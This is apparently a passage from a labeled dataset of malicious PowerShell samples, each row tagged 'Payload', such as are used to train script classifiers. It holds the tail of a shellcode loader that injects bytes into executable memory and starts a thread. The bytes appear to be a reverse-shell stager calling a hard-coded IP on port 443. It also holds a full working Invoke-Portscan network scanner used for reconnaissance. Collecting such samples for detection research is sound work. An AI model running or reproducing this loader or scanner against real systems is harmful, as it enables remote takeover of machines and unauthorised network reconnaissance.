50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x52,0xbd,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
e776d82de21ab5b31bf7f82827a29fbcedf3f6aa0e95e3e725eda9e4be061fb3,"function Invoke-Portscan
{


    [CmdletBinding()]Param (
        
        [Parameter(ParameterSetName=""cmdHosts"",

                   ValueFromPipeline=$True,
                   Mandatory = $True)]
                   [String[]] $Hosts,

        [Parameter(ParameterSetName=""fHosts"",
                   Mandatory = $True)]
                   [Alias(""iL"")]
                   [String]  $HostFile,

        [Parameter(Mandatory = $False)]
                   [Alias(""exclude"")]
                   [String] $ExcludeHosts,

        [Parameter(Mandatory = $False)]
                   [Alias(""p"")]
                   [String] $Ports,

        [Parameter(Mandatory = $False)]
                   [Alias(""iP"")]
                   [String] $PortFile,

        [Parameter(Mandatory = $False)]
                   [String] $TopPorts,

        [Parameter(Mandatory = $False)]
                   [Alias(""xPorts"")]
                   [String] $ExcludedPorts,

        
        [Parameter(Mandatory = $False)]
                   [Alias(""Pn"")]
                   [Switch] $SkipDiscovery,

        [Parameter(Mandatory = $False)]
                   [Alias(""sn"")]
                   [Switch] $PingOnly,

        [Parameter(Mandatory = $False)]
                   [Alias(""PS"")]
                   [string] $DiscoveryPorts = ""-1,445,80,443"",

        
        [Parameter(Mandatory = $False)]
                   [int] $Threads = 100,

        [Parameter(Mandatory = $False)]
                   [int] $nHosts = 25,

        [Parameter(Mandatory = $False)]
                   [int] $Timeout = 2000,

        [Parameter(Mandatory = $False)]
                   [int] $SleepTimer = 500,

        [Parameter(Mandatory = $False)]
                   [int] $SyncFreq = 1024,

        [Parameter(Mandatory = $False)]
                   [int] $T,

        
        [Parameter(Mandatory = $False)]
                   [Alias(""oG"")]
                   [String] $GrepOut,

        [Parameter(Mandatory = $False)]
                   [Alias(""oX"")]
                   [String] $XmlOut,

        [Parameter(Mandatory = $False)]
                   [Alias(""oN"")]
                   [String] $ReadableOut,

        [Parameter(Mandatory = $False)]
                   [Alias(""oA"")]
                   [String] $AllformatsOut,

        [Parameter(Mandatory = $False)]
                   [Switch] $noProgressMeter,

        [Parameter(Mandatory = $False)]
                   [Alias(""q"")]
                   [Switch] $quiet,

        [Parameter(Mandatory = $False)]
                   [Alias(""F"")]
                   [Switch] $ForceOverwrite

        
        
    )

    PROCESS {

        Set-StrictMode -Version 2.0

        $version = .13
        $hostList = New-Object System.Collections.ArrayList
        $portList = New-Object System.Collections.ArrayList
        $hostPortList = New-Object System.Collections.ArrayList

        $scannedHostList = @()

        function Parse-Hosts
        {
            Param (
                [Parameter(Mandatory = $True)] [String] $Hosts
            )

            [String[]] $iHosts = $Hosts.Split("","")

            foreach($iHost in $iHosts)
            {
                $iHost = $iHost.Replace("" "", """")

                if(!$iHost)
                {
                    continue
                }

                if($iHost.contains(""/""))
                {
                    $netPart = $iHost.split(""/"")[0]
                    [uint32]$maskPart = $iHost.split(""/"")[1]

                    $address = [System.Net.IPAddress]::Parse($netPart)

                    if ($maskPart -ge $address.GetAddressBytes().Length * 8)
                    {
                        throw ""Bad host mask""
                    }

                    $numhosts = [System.math]::Pow(2,(($address.GetAddressBytes().Length *8) - $maskPart))

                    $startaddress = $address.GetAddressBytes()
                    [array]::Reverse($startaddress)

                    $startaddress = [System.BitConverter]::ToUInt32($startaddress, 0)
                    [uint32]$startMask = ([System.math]::Pow(2, $maskPart)-1) * ([System.Math]::Pow(2,(32 - $maskPart)))
                    $startAddress = $startAddress -band $startMask

                    
                    $startAddress = [System.BitConverter]::GetBytes($startaddress)[0..3]
                    [array]::Reverse($startaddress)

                    $address = [System.Net.IPAddress] [byte[]] $startAddress

                    $hostList.Add($address.IPAddressToString)

                    for ($i=0; $i -lt $numhosts-1; $i++)
                    {

                        $nextAddress =  $address.GetAddressBytes()
                        [array]::Reverse($nextAddress)
                        $nextAddress =  [System.BitConverter]::ToUInt32($nextAddress, 0)
                        $nextAddress ++
                        $nextAddress = [System.BitConverter]::GetBytes($nextAddress)[0..3]
                        [array]::Reverse($nextAddress)

                        $address = [System.Net.IPAddress] [byte[]] $nextAddress
                        $hostList.Add($address.IPAddressToString)

                    }

                }
                else
                {
                    $hostList.Add($iHost)
                }
            }
        }

        function Parse-ILHosts
        {
           Param (
                [Parameter(Mandatory = $True)] [String] $HostFile
            )

            Get-Content $HostFile | ForEach-Object {
                Parse-Hosts $_
            }
        }

        function Exclude-Hosts
        {
            Param (
                [Parameter(Mandatory = $True)] [String] $excludeHosts
            )

            [String[]] $iHosts = $excludeHosts.Split("","")

            foreach($iHost in $iHosts)
            {
                $iHost = $iHost.Replace("" "", """")
                $hostList.Remove($iHost)
            }
        }

        function Get-TopPort
        {
            Param (
                [Parameter(Mandatory = $True)]
                [ValidateRange(1,1000)]
                [int] $numPorts
            )

            
            [int[]] $topPortList = @(80,23,443,21,3389,110,445,139,143,53,135,3306,8080,22
                        1723,111,995,993,5900,1025,1720,548,113,81,6001,179,1026,2000,8443,
                        8000,32768,554,26,1433,49152,2001,515,8008,49154,1027,5666,646,5000,
                        5631,631,49153,8081,2049,88,79,5800,106,2121,1110,49155,6000,513,
                        990,5357,49156,543,544,5101,144,7,389,8009,9999,5009,7070,5190,3000,
                        5432,1900,3986,13,1029,9,5051,6646,49157,1028,873,1755,2717,4899,9100,
                        119,37,1000,3001,5001,82,10010,1030,9090,2107,1024,2103,6004,1801,
                        5050,19,8031,1041,255,1048,1049,1053,1054,1056,1064,3703,17,808,3689,
                        1031,1044,1071,5901,100,9102,2869,4001,5120,8010,9000,2105,636,1038,
                        2601,1,7000,1066,1069,625,311,280,254,4000,1761,5003,2002,1998,2005,
                        1032,1050,6112,1521,2161,6002,2401,902,4045,787,7937,1058,2383,1033,
                        1040,1059,50000,5555,1494,3,593,2301,3268,7938,1022,1234,1035,1036,1037,
                        1074,8002,9001,464,497,1935,2003,6666,6543,24,1352,3269,1111,407,500,
                        20,2006,1034,1218,3260,15000,4444,264,33,2004,1042,42510,999,3052,1023,
                        222,1068,888,7100,1717,992,2008,7001,2007,8082,512,1043,2009,5801,1700,
                        7019,50001,4662,2065,42,2602,3333,9535,5100,2604,4002,5002,1047,1051,1052,
                        1055,1060,1062,1311,3283,4443,5225,5226,6059,6789,8089,8651,8652,8701,9415,
                        9593,9594,9595,16992,16993,20828,23502,32769,33354,35500,52869,55555,55600,
                        64623,64680,65000,65389,1067,13782,366,5902,9050,85,1002,5500,1863,1864,
                        5431,8085,10243,45100,49999,51103,49,90,6667,1503,6881,27000,340,1500,8021,
                        2222,5566,8088,8899,9071,5102,6005,9101,163,5679,146,648,1666,83,3476,5004,
                        5214,8001,8083,8084,9207,14238,30,912,12345,2030,2605,6,541,4,1248,3005,8007,
                        306,880,2500,1086,1088,2525,4242,8291,9009,52822,900,6101,2809,7200,211,800,
                        987,1083,12000,705,711,20005,6969,13783,1045,1046,1061,1063,1070,1072,1073,
                        1075,1077,1078,1079,1081,1082,1085,1093,1094,1096,1098,1099,1100,1104,1106,
                        1107,1108,1148,1169,1272,1310,1687,1718,1783,1840,2100,2119,2135,2144,2160,
                        2190,2260,2381,2399,2492,2607,2718,2811,2875,3017,3031,3071,3211,3300,3301,
                        3323,3325,3351,3404,3551,3580,3659,3766,3784,3801,3827,3998,4003,4126,4129,
                        4449,5222,5269,5633,5718,5810,5825,5877,5910,5911,5925,5959,5960,5961,5962,
                        5987,5988,5989,6123,6129,6156,6389,6580,6901,7106,7625,7777,7778,7911,8086,
                        8181,8222,8333,8400,8402,8600,8649,8873,8994,9002,9011,9080,9220,9290,9485,
                        9500,9502,9503,9618,9900,9968,10002,10012,10024,10025,10566,10616,10617,10621,
                        10626,10628,10629,11110,13456,14442,15002,15003,15660,16001,16016,16018,17988,
                        19101,19801,19842,20000,20031,20221,20222,21571,22939,24800,25734,27715,28201,
                        30000,30718,31038,32781,32782,33899,34571,34572,34573,40193,48080,49158,49159,
                        49160,50003,50006,50800,57294,58080,60020,63331,65129,691,212,1001,1999,2020,
                        2998,6003,7002,50002,32,2033,3372,99,425,749,5903,43,458,5405,6106,6502,7007,
                        13722,1087,1089,1124,1152,1183,1186,1247,1296,1334,1580,1782,2126,2179,2191,2251,
                        2522,3011,3030,3077,3261,3493,3546,3737,3828,3871,3880,3918,3995,4006,4111,4446,
                        5054,5200,5280,5298,5822,5859,5904,5915,5922,5963,7103,7402,7435,7443,7512,8011,
                        8090,8100,8180,8254,8500,8654,9091,9110,9666,9877,9943,9944,9998,10004,10778,15742,
                        16012,18988,19283,19315,19780,24444,27352,27353,27355,32784,49163,49165,49175,
                        50389,50636,51493,55055,56738,61532,61900,62078,1021,9040,666,700,84,545,1112,
                        1524,2040,4321,5802,38292,49400,1084,1600,2048,2111,3006,6547,6699,9111,16080,
                        555,667,720,801,1443,1533,2106,5560,6007,1090,1091,1114,1117,1119,1122,1131,1138,
                        1151,1175,1199,1201,1271,1862,2323,2393,2394,2608,2725,2909,3003,3168,3221,3322,
                        3324,3390,3517,3527,3800,3809,3814,3826,3869,3878,3889,3905,3914,3920,3945,3971,
                        4004,4005,4279,4445,4550,4567,4848,4900,5033,5080,5087,5221,5440,5544,5678,5730,
                        5811,5815,5850,5862,5906,5907,5950,5952,6025,6510,6565,6567,6689,6692,6779,6792,
                        6839,7025,7496,7676,7800,7920,7921,7999,8022,8042,8045,8093,8099,8200,8290,8292,
                        8300,8383,9003,9081,9099,9200,9418,9575,9878,9898,9917,10003,10180,10215,11111,
                        12174,12265,14441,15004,16000,16113,17877,18040,18101,19350,25735,26214,27356,
                        30951,32783,32785,40911,41511,44176,44501,49161,49167,49176,50300,50500,52673,
                        52848,54045,54328,55056,56737,57797,60443,70,417,714,722,777,981,1009,2022,4224,
                        4998,6346,301,524,668,765,2041,5999,10082,259,1007,1417,1434,1984,2038,2068,4343,
                        6009,7004,44443,109,687,726,911,1461,2035,4125,6006,7201,9103,125,481,683,903,
                        1011,1455,2013,2043,2047,6668,6669,256,406,843,2042,2045,5998,9929,31337,44442,
                        1092,1095,1102,1105,1113,1121,1123,1126,1130,1132,1137,1141,1145,1147,1149,1154,
                        1164,1165,1166,1174,1185,1187,1192,1198,1213,1216,1217,1233,1236,1244,1259,1277,
                        1287,1300,1301,1309,1322,1328,1556,1641,1688,1719,1721,1805,1812,1839,1875,1914,
                        1971,1972,1974,2099,2170,2196,2200,2288,2366,2382,2557,2800,2910,2920,2968,3007,
                        3013,3050,3119,3304,3307,3376,3400,3410,3514,3684,3697,3700,3824,3846,3848,3859,
                        3863,3870,3872,3888,3907,3916,3931,3941,3957,3963,3968,3969,3972,3990,3993,3994,
                        4009,4040,4080,4096,4143,4147,4200,4252,4430,4555,4600,4658,4875,4949,5040,5063,
                        5074,5151,5212,5223,5242,5279,5339,5353,5501,5807,5812,5818,5823,5868,5869,5899,
                        5905,5909,5914,5918,5938,5940,5968,5981,6051,6060,6068,6203,6247,6500,6504,6520,
                        6550,6600)
            $numPorts--
            $portList.AddRange($topPortList[0..$numPorts])
        }

        function Parse-Ports
        {
            Param (
                [Parameter(Mandatory = $True)] [String] $Ports,
                [Parameter(Mandatory = $True)] $pList
            )

            foreach ($pRange in $Ports.Split("",""))
            {

                
                if ($pRange -eq ""-1"")
                {
                    $pList.Add([int]$pRange)
                }
                elseif ($pRange.Contains(""-""))
                {
                    [int[]] $range = $pRange.Split(""-"")
                    if ($range.Count -ne 2 -or $pRange.Split(""-"")[0] -eq """" -or $pRange.split(""-"")[1] -eq """")
                    {
                        throw ""Invalid port range""
                    }

                    $pList.AddRange($range[0]..$range[1])
                }
                else
                {
                    $pList.Add([int]$pRange)
                }

            }
            foreach ($p in $pList)
            {
                if ($p -lt -1 -or $p -gt 65535)
                {
                    throw ""Port $p out of range""
                }
            }
         }

        function Parse-IpPorts
        {
           Param (
                [Parameter(Mandatory = $True)] [String] $PortFile
            )

            Get-Content $PortFile | ForEach-Object {
                Parse-Ports -Ports $_ -pList $portList
            }
        }

        function Remove-Ports
        {
            Param (
                [Parameter(Mandatory = $True)] [string] $ExcludedPorts
            )

            [int[]] $ExcludedPorts = $ExcludedPorts.Split("","")

            foreach ($x in $ExcludedPorts)
            {
                $portList.Remove($x)
            }
        }

        function Write-PortscanOut
        {
            Param (
                [Parameter(Mandatory = $True, ParameterSetName=""Comment"")] [string] $comment,
                [Parameter(Mandatory = $True, ParameterSetName=""HostOut"")] [string] $outhost,
                [Parameter(Mandatory = $True, ParameterSetName=""HostOut"")] [bool] $isUp,
                [Parameter(Mandatory = $True, ParameterSetName=""HostOut"")] $openPorts,
                [Parameter(Mandatory = $True, ParameterSetName=""HostOut"")] $closedPorts,
                [Parameter(Mandatory = $True, ParameterSetName=""HostOut"")] $filteredPorts,
                [Parameter()] [bool] $SkipDiscovery,
                [Parameter()] [System.IO.StreamWriter] $grepStream,
                [Parameter()] [System.Xml.XmlWriter] $xmlStream,
                [Parameter()] [System.IO.StreamWriter] $readableStream

            )
            switch ($PSCmdlet.ParameterSetName)
            {
                ""Comment""
                {

                    Write-Verbose $comment

                    if ($grepStream) {
                        $grepStream.WriteLine(""
                    }
                    if ($xmlStream) {
                        $xmlStream.WriteComment($comment)
                    }
                    if ($readableStream) {
                        $readableStream.WriteLine($comment)
                    }
                }
                ""HostOut""
                {
                    $oPort = [string]::join("","", $openPorts.ToArray())
                    $cPort = [string]::join("","", $closedPorts.ToArray())
                    $fPort = [string]::join("","", $filteredPorts.ToArray())

                    if ($grepStream) {
                       
                       if ($isUp -and !$SkipDiscovery) {
                            $grepStream.writeline(""Host: $outhost`tStatus: Up"")
                        }
                        if ($isUp -or $SkipDiscovery) {
                            if ($oPort -ne """") {
                                $grepStream.writeline(""Host: $outhost`tOpen Ports: $oPort"")
                            }
                            if ($cPort -ne """") {
                                $grepStream.writeline(""Host: $outhost`tClosed Ports: $cPort"")
                            }
                            if ($fPort -ne """") {
                                $grepStream.writeline(""Host: $outhost`tFiltered Ports: $fPort"")
                            }
                        }
                        elseif (!$SkipDiscovery) {
                            $grepStream.writeline(""Host: $outhost`tStatus: Down"")
                        }
                    }
                    if ($xmlStream) {
                        $xmlStream.WriteStartElement(""Host"")

                        $xmlStream.WriteAttributeString(""id"", $outhost)
                        if (!$SkipDiscovery) {
                            if ($isUp) {
                                $xmlStream.WriteAttributeString(""Status"", ""Up"")
                             }
                             else {
                                $xmlStream.WriteAttributeString(""Status"", ""Downs"")
                             }
                        }

                        $xmlStream.WriteStartElement(""Ports"")
                        foreach($p in $openPorts) {
                            $xmlStream.writestartElement(""Port"")
                            $xmlStream.WriteAttributeString(""id"", [string]$p)
                            $xmlStream.WriteAttributeString(""state"", ""open"")
                            $xmlStream.WriteEndElement()

                        }
                        foreach ($p in $closedPorts) {
                            $xmlStream.writestartElement(""Port"")
                            $xmlStream.WriteAttributeString(""id"", [string]$p)
                            $xmlStream.WriteAttributeString(""state"", ""closed"")
                            $xmlStream.WriteEndElement()
                        }
                        foreach ($p in $filteredPorts) {
                            $xmlStream.writestartElement(""Port"")
                            $xmlStream.WriteAttributeString(""id"", [string]$p)
                            $xmlStream.WriteAttributeString(""state"", ""filtered"")
                            $xmlStream.WriteEndElement()
                        }

                        $xmlStream.WriteEndElement()
                        $xmlStream.WriteEndElement()
                    }
                    if ($readableStream) {
                        $readableStream.writeline(""Porscan.ps1 scan report for $outhost"")
                        if ($isUp) {
                            $readableStream.writeline(""Host is up"")
                        }

                        if ($isUp -or $SkipDiscovery) {

                            $readableStream.writeline((""{0,-10}{1,0}"" -f ""PORT"", ""STATE""))

                            [int[]]$allports = $openPorts + $closedPorts + $filteredPorts
                            foreach($p in ($allports| Sort-Object))
                            {
                                if ($openPorts.Contains($p)) {
                                    $readableStream.writeline((""{0,-10}{1,0}"" -f $p, ""open""))
                                }
                                elseif ($closedPorts.Contains($p)) {
                                    $readableStream.writeline((""{0,-10}{1,0}"" -f $p, ""closed""))
                                }
                                elseif ($filteredPorts.Contains($p)) {
                                    $readableStream.writeline((""{0,-10}{1,0}"" -f $p, ""filtered""))
                                }
                            }

                        }
                        elseif(!$SkipDiscovery) {
                            $readableStream.writeline(""Host is Down"")
                        }
                        $readableStream.writeline("""")
                    }
                }
            }
        }

        
        function Convert-SwitchtoBool
        {
            Param (
                [Parameter(Mandatory = $True)] $switchValue
            )
            If ($switchValue) {
                return $True
            }
            return $False
        }

        try
        {

            [bool] $SkipDiscovery = Convert-SwitchtoBool ($SkipDiscovery)
            [bool] $PingOnly = Convert-SwitchtoBool ($PingOnly)
            [bool] $quiet  = Convert-SwitchtoBool ($quiet)
            [bool] $ForceOverwrite  = Convert-SwitchtoBool ($ForceOverwrite)

            
            
            

            [Environment]::CurrentDirectory=(Get-Location -PSProvider FileSystem).ProviderPath

            if ($PsCmdlet.ParameterSetName -eq ""cmdHosts"")
            {
                foreach($h in $Hosts)
                {
                    Parse-Hosts($h) | Out-Null
                }
            }
            else
            {
                Parse-ILHosts($HostFile) | Out-Null
            }
            if($ExcludeHosts)
            {
                Exclude-Hosts($ExcludeHosts)
            }
            if (($TopPorts -and $Ports) -or ($TopPorts -and $PortFile))
            {
                throw ""Cannot set topPorts with other specific ports""
            }
            if($Ports)
            {
                Parse-Ports -Ports $Ports -pList $portList | Out-Null
            }
            if($PortFile)
            {
                Parse-IpPorts($PortFile) | Out-Null
            }
            if($portList.Count -eq 0)
            {
                if ($TopPorts)
                {
                    Get-TopPort($TopPorts) | Out-Null
                }
                else
                {
                    
                    Get-TopPort(50) | Out-Null
                }
            }
            if ($ExcludedPorts)
            {
                Remove-Ports -ExcludedPorts $ExcludedPorts | Out-Null
            }

            if($T)
            {
                switch ($T)
                {
                    5 {$nHosts=30;  $Threads = 1000; $Timeout = 750 }
                    4 {$nHosts=25;  $Threads = 1000; $Timeout = 1200 }
                    3 {$nHosts=20;  $Threads = 100;  $Timeout = 2500 }
                    2 {$nHosts=15;  $Threads = 32;   $Timeout = 3000 }
                    1 {$nHosts=10;  $Threads = 32;   $Timeout = 5000 }
                    default {
                        throw ""Invalid T parameter""
                    }
                }
            }

            $grepStream = $null
            $xmlStream = $null
            $readableStream = $null

            if($AllformatsOut)
            {
                if ($GrepOut -or $XmlOut -or $ReadableOut) {
                     Write-Warning ""Both -oA specified with other output... going to ignore -oG/-oN/-oX""
                }
                $GrepOut = $AllformatsOut + "".gnmap""
                $XmlOut = $AllformatsOut + "".xml""
                $ReadableOut = $AllformatsOut + "".nmap""
            }
            if ($GrepOut) {
                if (!$ForceOverwrite -and (Test-Path $GrepOut)) {
                    throw ""Error: $AllformatsOut already exists. Either delete the file or specify the -f flag""
                }
                $grepStream = [System.IO.StreamWriter] $GrepOut
            }
            if ($ReadableOut) {
                if (!$ForceOverwrite -and (Test-Path $ReadableOut)) {
                    throw ""Error: $ReadableOut already exists. Either delete the file or specify the -f flag""
                }
                $readableStream = [System.IO.StreamWriter] $ReadableOut
            }
            if ($XmlOut) {
                if (!$ForceOverwrite -and (Test-Path $XmlOut)) {
                    throw ""Error: $XmlOut already exists. Either delete the file or specify the -f flag""
                }

                $xmlStream =   [System.xml.xmlwriter]::Create([string]$XmlOut)
                $xmlStream.WriteStartDocument()
                $xmlStream.WriteStartElement(""Portscanrun"")
                $xmlStream.WriteAttributeString(""version"", $version)

            }

            Parse-Ports -Ports $DiscoveryPorts -pList $hostPortList | Out-Null

            $startdate = Get-Date
            $myInvocationLine = $PSCmdlet.MyInvocation.Line
            $startMsg = ""Invoke-Portscan.ps1 v$version scan initiated $startdate as: $myInvocationLine""

            
            Write-PortscanOut -comment $startMsg -grepStream $grepStream -xmlStream $xmlStream -readableStream $readableStream

            
            $sPortList = [string]::join("","", $portList)
            $sHostPortList = [string]::join("","", $hostPortList)

            
            
            
            $portScanCode = {
                param (
                    [Parameter( Mandatory = $True)] [string] $thost,
                    [Parameter( Mandatory = $True)][bool] $SkipDiscovery,
                    [Parameter( Mandatory = $True)][bool] $PingOnly,
                    [Parameter( Mandatory = $True)][int] $Timeout,
                    [Parameter( Mandatory = $True)] $PortList,
                    [Parameter( Mandatory = $True)] $hostPortList,
                    [Parameter( Mandatory = $True)][int] $maxthreads)
                Process
                {
                $openPorts = New-Object System.Collections.ArrayList
                $closedPorts = New-Object System.Collections.ArrayList
                $filteredPorts = New-Object System.Collections.ArrayList

                $sockets = @{}
                $timeouts = New-Object Hashtable

                
                $fThreads = New-Object int
                $aThreads = New-Object int
                [System.Threading.ThreadPool]::GetMaxThreads([ref]$fThreads, [ref]$aThreads) | Out-Null
                [System.Threading.ThreadPool]::SetMaxThreads($fthreads,$maxthreads) | Out-Null

                function New-ScriptBlockCallback {
                    param(
                        [parameter(Mandatory=$true)]
                        [ValidateNotNullOrEmpty()]
                        [scriptblock]$Callback
                    )

                    
                    if (-not (""CallbackEventBridge"" -as [type])) {
                        Add-Type @""
                            using System;

                            public sealed class CallbackEventBridge
                            {
                                public event AsyncCallback CallbackComplete = delegate { };

                                private CallbackEventBridge() {}

                                private void CallbackInternal(IAsyncResult result)
                                {
                                    CallbackComplete(result);
                                }

                                public AsyncCallback Callback
                                {
                                    get { return new AsyncCallback(CallbackInternal); }
                                }

                                public static CallbackEventBridge Create()
                                {
                                    return new CallbackEventBridge();
                                }
                            }
""@
                    }

                    $bridge = [CallbackEventBridge]::Create()
                    Register-ObjectEvent -InputObject $bridge -EventName CallbackComplete -Action $Callback | Out-Null

                    $bridge.Callback

                }

                function Test-Port {

                    Param (
                        [Parameter(Mandatory = $True)] [String] $h,
                        [Parameter(Mandatory = $True)] [int] $p,
                        [Parameter(Mandatory = $True)] [int] $timeout
                    )

                    try {
                        $pAddress = [System.Net.IPAddress]::Parse($h)
                        $sockets[$p] = new-object System.Net.Sockets.TcpClient $pAddress.AddressFamily

                    }
                    catch {
                        
                        $sockets[$p] = new-object System.Net.Sockets.TcpClient
                    }

                    
                    $scriptBlockAsString = @""

                        
                        if ( `$sockets[$p] -ne `$NULL)
                        {
                            if (!`$timeouts[$p].Disposed) {
                                `$timeouts[$p].Dispose()
                            }

                            `$status = `$sockets[$p].Connected;
                            if (`$status -eq `$True)
                            {
                                
                                `$openPorts.Add($p)
                            }
                            else
                            {
                                
                                `$closedPorts.Add($p)

                            }
                            `$sockets[$p].Close();

                            `$sockets.Remove($p)
                        }
""@
                    $timeoutCallback = @""
                        
                        `$sockets[$p].Close()
                        if (!`$timeouts[$p].Disposed) {
                            `$timeouts[$p].Dispose()
                            `$filteredPorts.Add($p)
                        }
                        `$sockets.Remove($p)
""@

                    $timeoutCallback = [scriptblock]::Create($timeoutCallback)

                    $timeouts[$p] = New-Object System.Timers.Timer
                    Register-ObjectEvent -InputObject $timeouts[$p] -EventName Elapsed -Action $timeoutCallback | Out-Null
                    $timeouts[$p].Interval = $timeout
                    $timeouts[$p].Enabled = $true

                    $myscriptblock = [scriptblock]::Create($scriptBlockAsString)
                    $x = $sockets[$p].beginConnect($h, $p,(New-ScriptBlockCallback($myscriptblock)) , $null)

                }

                function PortScan-Alive
                {
                    Param (
                        [Parameter(Mandatory = $True)] [String] $h
                    )

                    Try
                    {

                        
                        if ($hostPortList.Contains(-1))
                        {
                            $ping = new-object System.Net.NetworkInformation.Ping
                            $pResult = $ping.send($h)
                            if ($pResult.Status -eq ""Success"")
                            {
                                return $True
                            }
                        }
                        foreach($Port in $hostPortList)
                        {
                            if ($Port -ne -1)
                            {
                                Test-Port -h $h -p $Port -timeout $Timeout
                            }
                        }

                        do {
                            Start-Sleep -Milli 100
                            if (($openPorts.Count -gt 0) -or ($closedPorts.Count -gt 0)) {
                                return $True
                            }
                        }
                        While ($sockets.Count -gt 0)

                    }
                    Catch
                    {
                        Write-Error ""Exception trying to host scan $h""
                        Write-Error $_.Exception.Message;
                    }

                    return $False
                }

                function Portscan-Port
                {
                    Param (
                        [Parameter(Mandatory = $True)] [String] $h
                    )

                    [string[]]$Ports = @()

                    foreach($Port in $Portlist)
                    {
                        Try
                        {
                            Test-Port -h $h -p $Port -timeout $Timeout
                        }
                        Catch
                        {
                            Write-Error ""Exception trying to scan $h port $Port""
                            Write-Error $_.Exception.Message;
                        }
                    }
                }
                [bool] $hostResult = $False

                if(!$SkipDiscovery)
                {
                    [bool] $hostResult = PortScan-Alive $thost
                    $openPorts.clear()
                    $closedPorts.clear()
                    $filteredPorts.Clear()
                }
                if((!$PingOnly) -and ($hostResult -or $SkipDiscovery))
                {
                    Portscan-Port $thost
                }
                while ($sockets.Count -gt 0) {
                    Start-Sleep -Milli 500
                }

                return @($hostResult, $openPorts, $closedPorts, $filteredPorts)
                }
            }

            
            

            [int]$saveIteration = 0
            [int]$computersDone=0
            [int]$upHosts=0
            while (($saveIteration * $SyncFreq) -lt $hostList.Count)
            {

                Get-Job | Remove-Job -Force
                $sIndex = ($saveIteration*$SyncFreq)
                $eIndex = (($saveIteration+1)*$SyncFreq)-1

                foreach ($iHost in $hostList[$sIndex..$eIndex])
                {
                    $ctr = @(Get-Job -state Running)
                    while ($ctr.Count -ge $nHosts)
                    {
                        Start-Sleep -Milliseconds $SleepTimer
                        $ctr = @(Get-Job -state Running)
                    }

                    $computersDone++
                    if(!$noProgressMeter)
                    {
                        Write-Progress -status ""Port Scanning"" -Activity $startMsg -CurrentOperation ""starting computer $computersDone""  -PercentComplete ($computersDone / $hostList.Count * 100)
                    }

                    Start-Job -ScriptBlock $portScanCode -Name $iHost -ArgumentList @($iHost, $SkipDiscovery, $PingOnly, $Timeout, $portList, $hostPortList, $Threads)  | Out-Null
                }

                Get-Job | Wait-Job | Out-Null

                foreach ($job in Get-Job)
                {
                    $jobOut = @(Receive-Job $job)
                    [bool]$hostUp = $jobOut[0]
                    $jobName = $job.Name

                    $openPorts = $jobOut[1]
                    $closedPorts = $jobOut[2]
                    $filteredPorts = $jobOut[3]

                    if($hostUp) {
                        $upHosts ++
                    }

                    if (!$quiet)
                    {
                        $hostDate = Get-Date
                        $hostObj = New-Object System.Object
                        $hostObj | Add-Member -MemberType Noteproperty -Name Hostname -Value $jobName

                        $hostObj | Add-Member -MemberType Noteproperty -Name alive -Value $hostUp
                        $hostObj | Add-Member -MemberType Noteproperty -Name openPorts -Value $openPorts
                        $hostObj | Add-Member -MemberType Noteproperty -Name closedPorts -Value $closedPorts
                        $hostObj | Add-Member -MemberType Noteproperty -Name filteredPorts -Value $filteredPorts
                        $hostObj | Add-Member -MemberType NoteProperty -Name finishTime -Value $hostDate

                        $scannedHostList += $hostobj
                    }

                    Write-PortscanOut -outhost $jobName -isUp $hostUp -openPorts $openPorts -closedPorts $closedPorts -filteredPorts $filteredPorts -grepStream $grepStream -xmlStream $xmlStream -readableStream $readableStream -SkipDiscovery $SkipDiscovery
                }

                if ($grepStream) {
                    $grepStream.flush()
                }
                if ($xmlStream) {
                    $xmlStream.flush()
                }
                if($readableStream) {
                    $readableStream.flush()
                }

                $saveIteration ++
            }

            $enddate = Get-Date
            $totaltime = ($enddate - $startdate).TotalSeconds
            $endMsg = ""Port scan complete at $enddate ($totaltime seconds)""
            if (!$SkipDiscovery) {
                $endMsg += "", $upHosts hosts are up""
            }

            Write-PortscanOut -comment $endMsg -grepStream $grepStream -xmlStream $xmlStream -readableStream $readableStream

            if($grepStream) {
                $grepStream.Close()
            }
            if ($xmlStream) {
                $xmlStream.Close()
            }
            if($readableStream) {
                $readableStream.Close()
            }

            return $scannedHostList

        }
        Catch
        {
            Write-Error $_.Exception.Message;
        }
    }
}
",Payload
e87fff8811c9ecef1274c770e5bbf5dd1c9d99a56ea9f76e39cc90311d71be02,"
